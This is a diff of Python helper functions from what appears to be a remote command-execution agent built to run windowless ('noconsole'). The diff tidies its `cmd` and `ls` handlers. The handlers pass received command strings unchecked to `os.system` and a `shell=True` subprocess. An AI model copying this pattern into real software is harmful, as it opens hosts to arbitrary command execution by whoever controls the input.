@@ -155,20 +155,6 @@ def execute_cmd(command, is_shell: bool, logger) -> str:
         return f'cmd error: {error}'
 
 
-# def cmd(command: list, is_shell: bool,  logger) -> str:
-#     '''command sample: makedir newfolder'''
-#     # TODO: add timeout
-
-#     logger.info(f'try to run: {command}')
-
-#     output = subprocess.run(command, shell=True, capture_output=True)
-
-    # output = str(output).replace('\\r\\n', '\n')  # cleaning data
-    # output = str(output).replace('\\n', '\n')
-#     output = str(output).replace("b'", '')
-    # output = output[2:]  # remove b'
-#     return output
-
 def clean_shell_data(output):
     output = str(output).replace('\\r\\n', '\n')  # cleaning data
     output = str(output).replace('\\n', '\n')
@@ -181,25 +167,12 @@ def cmd(command: list, is_shell: bool, logger):
 
     logger.info(f'try to run: {command}')
 
-    outputFileName = 'data.txt'
-
     if not is_shell:
 
+        # if compile code on noconsole i can get stdout:
         os_result = os.system(' '.join(command))
         return f'''output code {os_result} \n\nyou compile app noconsole (is_shell = False), That\'s why I can\'t get the output text by `cmd` command
         (for get directory list use `ls` command, like : `ls /home`)'''
-
-        # # this a bug (if compile code on noconsole i can get stdout ..):
-        # with open(outputFileName, "w") as outputFile:
-        #     result = subprocess.call(
-        #         command, shell=True, stdout=outputFile, stderr=subprocess.STDOUT)
-
-        # with open(outputFileName, "r") as outputFile:
-        #     file_data = outputFile.readlines()
-        #     result = f'{file_data} \n\nreturn code {result}'
-        #     outputFile.close()
-        # os.remove(outputFileName)
-        # return clean_shell_data(result)
 
     else:
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
@@ -216,7 +189,11 @@ def execute_ls(command, logger) -> str:
     logger.info(f'execute ls: {command}')
 
     try:
-        return ls(command[1])
+        if len(command) >= 2:
+            route = command[1]
+        else:
+            route = '.'
+        return ls(route)
     except exception as error:
         return f'execute_ls error: {error} '
 
